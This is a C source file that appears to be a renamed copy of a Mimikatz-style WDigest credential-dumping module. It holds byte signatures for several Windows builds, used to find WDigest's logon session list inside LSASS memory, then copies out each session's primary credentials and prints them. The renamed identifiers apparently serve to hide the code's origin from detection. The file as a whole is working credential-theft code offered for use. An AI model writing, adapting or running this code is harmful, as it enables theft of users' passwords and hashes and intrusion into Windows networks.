#include "my_modules_clear.h"



PMPW_WDIGEST_LIST_ENTRY l_LogSessList = NULL;
LONG offsetWDigestPrimary = 0;

MY_M_MODULES_PACKAGE my_m_modules_wdigest_package = { my_m_modules_enum_logon_callback_wdigest, TRUE, (wchar_t*)(L"waitforinit"), {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
const PMY_M_MODULES_PACKAGE my_m_modules_wdigest_single_package[] = {&my_m_modules_wdigest_package};

NTSTATUS my_m_modules_wdigest(int argc, wchar_t* argv[])
{

    return my_m_modules_getLogonData(my_m_modules_wdigest_single_package, 1);
}

void CALLBACK my_m_modules_enum_logon_callback_wdigest(IN PMPW_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
#if defined(_M_X64)
    BYTE PTRN_WIN5_PasswdSet[] = { 0x48, 0x3b, 0xda, 0x74 };
    BYTE PTRN_WIN6_PasswdSet[] = { 0x48, 0x3b, 0xd9, 0x74 };
    PW_M_PATCH_GENERIC WDigestReferences[] = {
        {PW_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_PasswdSet),	PTRN_WIN5_PasswdSet},	{0, NULL}, {-4, 36}},
        {PW_M_WIN_BUILD_2K3,		{sizeof(PTRN_WIN5_PasswdSet),	PTRN_WIN5_PasswdSet},	{0, NULL}, {-4, 48}},
        {PW_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WIN6_PasswdSet),	PTRN_WIN6_PasswdSet},	{0, NULL}, {-4, 48}},
    };
#elif defined(_M_IX86)
    BYTE PTRN_WIN5_PasswdSet[] = { 0x74, 0x18, 0x8b, 0x4d, 0x08, 0x8b, 0x11 };
    BYTE PTRN_WIN6_PasswdSet[] = { 0x74, 0x11, 0x8b, 0x0b, 0x39, 0x4e, 0x10 };
    BYTE PTRN_WIN63_PasswdSet[] = { 0x74, 0x15, 0x8b, 0x0a, 0x39, 0x4e, 0x10 };
    BYTE PTRN_WIN64_PasswdSet[] = { 0x74, 0x15, 0x8b, 0x0f, 0x39, 0x4e, 0x10 };
    BYTE PTRN_WIN1809_PasswdSet[] = { 0x74, 0x15, 0x8b, 0x17, 0x39, 0x56, 0x10 };
    PW_M_PATCH_GENERIC WDigestReferences[] = {
        {PW_M_WIN_BUILD_XP,		{sizeof(PTRN_WIN5_PasswdSet),	PTRN_WIN5_PasswdSet},	{0, NULL}, {-6, 36}},
        {PW_M_WIN_BUILD_2K3,		{sizeof(PTRN_WIN5_PasswdSet),	PTRN_WIN5_PasswdSet},	{0, NULL}, {-6, 28}},
        {PW_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WIN6_PasswdSet),	PTRN_WIN6_PasswdSet},	{0, NULL}, {-6, 32}},
        {PW_M_WIN_MIN_BUILD_BLUE,	{sizeof(PTRN_WIN63_PasswdSet),	PTRN_WIN63_PasswdSet},	{0, NULL}, {-4, 32}},
        {PW_M_WIN_MIN_BUILD_10,	{sizeof(PTRN_WIN64_PasswdSet),	PTRN_WIN64_PasswdSet},	{0, NULL}, {-6, 32}},
        {PW_M_WIN_BUILD_10_1809,	{sizeof(PTRN_WIN1809_PasswdSet),	PTRN_WIN1809_PasswdSet},	{0, NULL}, {-6, 32}},
    };
#endif


	PW_M_MEMORY_ADDRESS aLocalMemory = {NULL, &PW_M_MEMORY_GLOBAL_OWN_HANDLE}, aLsMemory = {NULL, pData->cLs->hLsMem};
	SIZE_T taille;
	BOOL wasNotInit = !my_m_modules_wdigest_package.Module.isInit;
	
	if(my_m_modules_wdigest_package.Module.isInit || my_m_modules_utils_search_generic(pData->cLs, &my_m_modules_wdigest_package.Module, WDigestReferences, ARRAYSIZE(WDigestReferences), (PVOID *) &l_LogSessList, NULL, NULL, &offsetWDigestPrimary))
	{

		aLsMemory.address = l_LogSessList;
		taille = offsetWDigestPrimary + sizeof(MPW_GENERIC_PRIMARY_CREDENTIAL);
		if(aLsMemory.address = my_m_modules_utils_pFromLinkedListByLuid(&aLsMemory, FIELD_OFFSET(MPW_WDIGEST_LIST_ENTRY, LocallyUniqueIdentifier), pData->LogonId))
		{
			if(aLocalMemory.address = LocalAlloc(LPTR, taille))
			{
				if(pw_m_memory_copy(&aLocalMemory, &aLsMemory, taille))
					my_m_modules_genericCredsOutput((PMPW_GENERIC_PRIMARY_CREDENTIAL) ((PBYTE) aLocalMemory.address + offsetWDigestPrimary), pData, 0);
				LocalFree(aLocalMemory.address);
			}
		}
	}
}